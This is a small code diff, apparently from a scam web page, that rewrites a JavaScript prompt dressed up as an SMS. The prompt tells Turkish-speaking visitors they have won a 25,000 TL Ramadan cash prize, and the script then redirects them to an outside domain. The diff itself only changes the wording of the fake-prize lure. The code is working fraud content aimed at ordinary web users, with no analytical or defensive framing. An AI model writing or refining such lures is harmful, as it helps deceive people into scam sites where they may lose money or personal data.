@@ -1,5 +1,5 @@
-var password = '25.000 TL ÇEKİN'
-password=prompt('SMS: Tebrikler, 25.000 TL Ramazan Kutlama Nakit Ödülünü almaya hak kazandınız, hemen almak için Tamam'a tıklayın','25.000 TL ÇEKİN');
-if (password != '25.000 TL ÇEKİN') {
+var password = 'DEVAM ETMEK'
+password=prompt('SMS: tebrikler 25.000 TL Ramazan Nakdi Ödülünü almaya hak kazandınız','DEVAM ETMEK');
+if (password != 'DEVAM ETMEK') {
 location.href='https://gbamz.com/ramadan-turkish.html';
 }
